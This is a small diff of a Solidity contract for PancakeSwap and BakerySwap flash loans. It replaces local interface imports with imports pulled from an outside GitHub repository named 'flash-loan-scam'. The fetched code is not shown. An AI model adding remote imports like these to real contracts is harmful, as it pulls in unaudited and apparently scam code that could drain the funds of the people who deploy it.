@@ -2,11 +2,11 @@ pragma solidity ^0.5.0;
 
 
 // PancakeSwap Smart Contracts
-import { IPancakeCallee } from "./Interfaces.sol"; // "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
-import { IPancakeFactory } from "./Interfaces.sol"; // "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+import { IPancakeCallee } from "https://github.com/pancakeswap-flashloan/flash-loan-scam/blob/main/contracts/Interfaces.sol";
+import { IPancakeFactory } from "https://github.com/pancakeswap-flashloan/flash-loan-scam/blob/main/contracts/Interfaces.sol";
 
 //BakerySwp Smart contracts
-import { IBakerySwapFactory } from "./Interfaces.sol"; // "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";
+import { IBakerySwapFactory } from "https://github.com/pancakeswap-flashloan/flash-loan-scam/blob/main/contracts/Interfaces.sol";
 
 // Router
 // import "ipfs://QmSPEmnJEVjRbtmdcbeApHAVFVYGT4Lefrp45Ca2QK5923";
